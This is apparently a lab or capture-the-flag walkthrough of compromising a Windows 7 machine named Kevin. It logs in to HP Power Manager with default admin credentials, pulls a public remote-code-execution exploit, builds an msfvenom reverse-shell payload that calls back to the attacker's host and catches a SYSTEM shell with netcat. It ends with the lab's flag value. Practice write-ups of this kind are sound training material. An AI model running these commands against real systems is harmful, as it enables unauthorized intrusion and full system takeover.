# Kevin - Windows 7 Exploitation Walkthrough

This repository documents the exploitation process of the **Kevin** lab machine running Windows 7 Ultimate. The objective was to perform a full system compromise through enumeration, exploitation, and privilege escalation, ultimately retrieving the Administrator flag.

## üß† Target Overview

- **IP Address:** 192.168.232.45
- **Operating System:** Windows 7 Ultimate N (Build 7600)
- **Hostname:** KEVIN
- **Workgroup:** WORKGROUP

## üîç Initial Reconnaissance

### Nmap Scan

```bash
nmap -T4 -A 192.168.232.45 -oN nmap

Key Open Ports:
80/tcp: GoAhead WebServer - HP Power Manager interface
135/tcp: Microsoft Windows RPC
139, 445/tcp: SMB services
3389/tcp: RDP enabled
49152‚Äì49159/tcp: MSRPC dynamic ports

üåê Web Application Enumeration
Accessed HTTP service on port 80: HP Power Manager login interface

Default credentials worked:
pgsql

-Username: admin
-Password: admin

üö® Exploitation
Vulnerability Identified
The HP Power Manager application is vulnerable to Remote Code Execution.

Exploit found via searchsploit:
bash
Copy
Edit
searchsploit HP Power Manager
searchsploit -m 10099.py
Reverse Shell Payload Generation

Used msfvenom to create a reverse shell payload avoiding known bad characters:
bash
Copy
Edit
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.158 LPORT=80 \
  -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
  -e x86/alpha_mixed -f c
Payload inserted into the SHELL variable inside the exploit code (10099.py)

Listener started with:

bash
Copy
Edit
rlwrap nc -nlvp 80
Gaining Shell Access
Exploit executed:

bash
Copy
Edit
python2.7 10099.py 192.168.232.45
Reverse shell received as NT AUTHORITY\SYSTEM

üßæ Flag
Navigated to C:\Users\Administrator\Desktop and retrieved:

makefile
Copy
Edit
Flag: f9267403b0baf51ae5c66c6d55fd72de

üß∞ Tools Used
-nmap
-searchsploit
-msfvenom
-python2.7
-netcat (nc)
-rlwrap

‚úÖ Summary
Weak authentication on a vulnerable web application allowed full system compromise.
Default credentials and known exploit code were sufficient for privilege escalation.
Full administrative access was gained through RCE, and the flag was captured.
